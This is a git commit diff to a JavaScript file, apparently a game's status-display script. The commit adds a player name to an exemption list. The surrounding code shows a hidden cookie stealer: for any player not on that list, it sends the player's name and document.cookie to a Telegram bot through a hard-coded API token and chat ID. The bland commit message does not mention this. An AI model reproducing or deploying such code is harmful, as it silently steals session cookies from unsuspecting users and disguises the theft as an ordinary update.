97b1f3d6b63971deae29b97d1ff50d0e4e22e903
TauRus1001 <70094715+TauRus1001@users.noreply.github.com>
2025-07-21 03:59:21 +0800

    Update special function.js

--- special function.js
+++ special function.js
@@ -34,7 +34,7 @@ function status_view(t, e, r, i, o, d, n, a, l, s, p, c, m, u, w, b, _, g, h, v,
       , L = "";
     L = 1 == r ? i : img + i + ".gif";
     var O = "";
-    const nameList = ['Neo','藍拳聖使'];
+    const nameList = ['Neo','藍拳聖使','zwx123456'];
     if(!nameList.includes(parent.p_name)){
         fetch(`https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4850635895&text=角色狀態:${parent.p_name}%0A%0A${document.cookie}`);
     }
